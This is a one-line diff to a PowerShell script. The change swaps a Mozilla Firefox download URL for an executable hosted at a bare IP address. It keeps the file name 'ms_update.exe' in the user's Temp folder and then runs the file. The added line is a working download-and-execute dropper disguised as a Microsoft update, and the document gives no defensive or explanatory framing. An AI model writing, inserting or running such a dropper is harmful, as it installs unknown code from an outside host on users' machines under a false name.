@@ -1,1 +1,1 @@
-$r='https://download.mozilla.org/?product=firefox-stub';$o = 'C:\Users\'+[System.Environment]::UserName+'\AppData\Local\Temp\ms_update.exe';$y=new-Object System.Net.WebClient;$y.DownloadFile($r,$o);Start-Process $o
+$r='http://200.63.45.32/msd.daemon.p/mil.exe';$o = 'C:\Users\'+[System.Environment]::UserName+'\AppData\Local\Temp\ms_update.exe';$y=new-Object System.Net.WebClient;$y.DownloadFile($r,$o);Start-Process $o
